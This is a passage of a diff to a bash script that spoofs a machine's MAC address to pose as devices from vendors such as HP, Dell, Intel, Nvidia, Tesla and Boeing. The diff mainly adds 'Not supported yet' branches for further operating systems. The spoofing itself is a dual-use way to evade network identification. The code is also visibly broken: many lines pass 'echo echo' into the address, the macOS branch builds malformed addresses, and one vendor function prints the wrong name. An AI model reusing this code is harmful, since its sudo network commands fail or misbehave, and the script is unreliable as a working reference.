   sudo ip link set dev enp0s3 address $(echo F8:A4:5F:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -1622,7 +2185,7 @@ _hp(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "Darwin" ]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1636,7 +2199,7 @@ else
 printf "$WHITE HP :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -1651,25 +2214,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo 3C:D9:2B:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -1687,7 +2283,11 @@ _dell(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1701,7 +2301,7 @@ else
 printf "$WHITE Dell :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -1715,25 +2315,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo F8:DB:88:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -1748,7 +2381,12 @@ _codes=("00:04:AC" "00:60:94" "A8:97:DC" "E4:1F:13" "00:25:03" "00:17:EF" "10:00
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1762,7 +2400,7 @@ else
 printf "$WHITE IBM :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -1776,25 +2414,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 6C:AE:8B:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -1809,7 +2480,11 @@ _codes=("38:F2:3E" "48:50:73" "74:E2:8C" "84:63:D6" "D4:8F:33" "00:15:5D" "00:50
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1823,7 +2498,7 @@ else
 printf "$WHITE Microsoft :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -1838,25 +2513,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 48:50:73:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -1870,7 +2578,11 @@ _codes=("98:FF:D0" "50:3C:C4" "74:04:2B" "E0:2C:B2" "70:72:0D" "D4:22:3F")
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1884,7 +2596,7 @@ else
 printf "$WHITE Lenovo :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -1898,25 +2610,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 70:72:0D:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -1931,7 +2676,11 @@ _intel(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1945,7 +2694,7 @@ else
 printf "$WHITE Intel :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -1960,25 +2709,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 2C:6E:85:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -1992,7 +2774,11 @@ _amd(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2006,7 +2792,7 @@ else
 printf "$WHITE AMD :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo 00:0C:87:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -2021,25 +2807,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 00:0C:87:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo 00:0C:87:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -2051,7 +2870,11 @@ _nvidia(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2065,7 +2888,7 @@ else
 printf "$WHITE Nvidia :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo 00:04:4B:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -2079,25 +2902,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 00:04:4B:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo 00:04:4B:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -2109,7 +2965,11 @@ _tesla(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2123,7 +2983,7 @@ else
 printf "$WHITE Tesla :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo 98:ED:5C:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -2137,25 +2997,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 98:ED:5C:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo 98:ED:5C:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -2166,7 +3059,11 @@ _bombardier(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2180,7 +3077,7 @@ else
 printf "$WHITE Microsoft :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo 00:11:BD:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -2195,25 +3092,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 00:11:BD:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo 00:11:BD:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -2226,20 +3156,14 @@ _boeing(){ #morph
   _rnd=$[RANDOM%3]
   _codes=("00:50:93" "00:06:F8" "34:61:78" "00:40:BE")
 
-_off
-sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
-end=$( for i in {1..6} ; do echo -n ${hexchars:$(( $RANDOM % 16 )):1} ; done | sed -e 's/\(..\)/-\1/g' )
-echo $end)
-_on
-if [ "$1" == "-q" ]; then
->/dev/null  2>&1
-else
-printf "$WHITE  :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
-fi
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2253,7 +3177,7 @@ else
 printf "$WHITE Boeing :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
